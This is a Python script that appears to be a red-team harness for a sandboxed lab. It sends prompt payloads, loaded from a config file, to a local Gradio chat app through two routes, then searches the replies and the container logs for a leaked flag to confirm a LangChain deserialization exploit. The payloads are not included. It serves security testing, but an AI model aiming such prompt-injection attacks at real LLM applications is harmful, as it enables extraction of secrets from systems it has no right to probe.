import logging
import subprocess
import sys
import tomllib
from pathlib import Path

import httpx
from gradio_client import Client

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("red_team")


def load_config() -> dict:
    """Load configuration from TOML file."""
    config_path = Path(__file__).parent / "config" / "config.toml"
    with open(config_path, "rb") as f:
        return tomllib.load(f)


def check_container_logs(container_name: str = "gradio_container") -> str:
    """Extract logs from the sandbox container using Podman or Docker."""
    for cmd in [
        ["podman", "logs", container_name],
        ["docker", "logs", container_name],
    ]:
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, check=True)
            return res.stdout
        except (FileNotFoundError, subprocess.CalledProcessError):
            continue
    return ""


def main():
    cfg = load_config()
    target_host = cfg.get("target", {}).get("host", "http://localhost")
    target_port = cfg.get("target", {}).get("port", 7860)
    target_url = f"{target_host}:{target_port}"

    attack_cfg = cfg.get("attack", {})
    prompts = attack_cfg.get("prompts") or attack_cfg.get("prompt", [])
    if not isinstance(prompts, list):
        prompts = [prompts]

    logger.info("[*] Target sandbox endpoint: %s", target_url)
    compromised = False

    # Attempt connecting via Gradio client
    client = None
    try:
        client = Client(target_url, verbose=False)
        logger.info("[+] Successfully connected to Gradio client API")
    except (httpx.HTTPError, OSError, ValueError) as exc:
        logger.warning("[-] Direct Gradio client connection unavailable: %s", exc)

    for idx, payload in enumerate(prompts):
        logger.info("[*] Dispatching Round %d: %s...", idx + 1, payload[:60])
        response_text = ""

        # Vector 1: Gradio client predict
        if client:
            try:
                result = client.predict(payload, api_name="/chat")
                response_text = str(result)
            except (httpx.HTTPError, OSError, ValueError, RuntimeError) as exc:
                logger.debug("Gradio predict failed (%s), trying HTTP fallback", exc)

        # Vector 2: HTTP direct POST fallback
        if not response_text:
            try:
                with httpx.Client(timeout=15.0) as http_client:
                    resp = http_client.post(
                        f"{target_url}/api/chat",
                        json={"data": [payload]},
                    )
                    if resp.status_code == 200:
                        response_text = resp.text
            except (httpx.HTTPError, OSError) as exc:
                logger.debug("HTTP request failed: %s", exc)

        if response_text:
            logger.info(
                "[+] Received Response [%d chars]: %s",
                len(response_text),
                response_text[:120],
            )
            if "LEAKED SECRET" in response_text or "C0ngr4ts" in response_text:
                logger.info("[!] Exfiltrated flag observed in application response.")
                compromised = True

    # Vector 3: Verify server-side container logs
    logs = check_container_logs("gradio_container")
    if "LEAKED SECRET" in logs or "C0ngr4ts" in logs:
        logger.info("[!] Secret leakage confirmed in container log traces.")
        compromised = True

    if compromised:
        logger.info(
            "[!] EXPLOIT CONFIRMED: LangChain deserialization vulnerability verified."
        )
        sys.exit(0)
    else:
        logger.error("[-] Exploit verification did not succeed against target.")
        sys.exit(1)


if __name__ == "__main__":
    main()
